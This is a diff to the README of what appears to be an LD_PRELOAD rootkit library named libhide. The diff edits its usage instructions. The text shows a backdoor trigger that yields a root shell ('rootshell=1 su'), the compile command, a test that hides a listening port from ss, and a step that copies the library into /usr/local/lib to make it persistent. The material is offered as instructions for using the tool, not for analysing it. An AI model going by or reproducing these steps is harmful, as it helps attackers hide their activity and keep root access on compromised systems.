@@ -13,14 +13,15 @@ Also, you can get a rootshell
 ```
 rootshell=1 su
 ```
+First, compile as a shared library
 ```
 gcc -fPIC -shared -o libhide.so.2 libhide.c -ldl
 ```
-To test this out, use the following (for example)
+To test out functions, use the following (for example)
 ```
 LD_PRELOAD=./libhide.so.2 ss -tulpn | grep 8000
 ```
-To make it permanent, do the following:
+To make it more permanent, do the following:
 ```
 sudo cp libhide.so.2 /usr/local/lib
 ```
